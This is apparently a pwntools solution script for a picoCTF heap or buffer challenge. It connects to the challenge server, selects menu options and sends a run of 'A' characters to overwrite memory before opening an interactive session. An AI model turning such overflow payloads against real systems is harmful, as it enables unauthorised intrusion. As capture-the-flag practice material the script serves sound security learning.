from pwn import *

elf = context.binary = ELF('./chall')
#ly = process()
ly = remote('tethys.picoctf.net', 58407)

ly.sendlineafter('Enter your choice: ', '2')
payload = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
ly.sendlineafter('Data for buffer: ', payload)

ly.sendlineafter('Enter your choice: ', '4')

ly.interactive()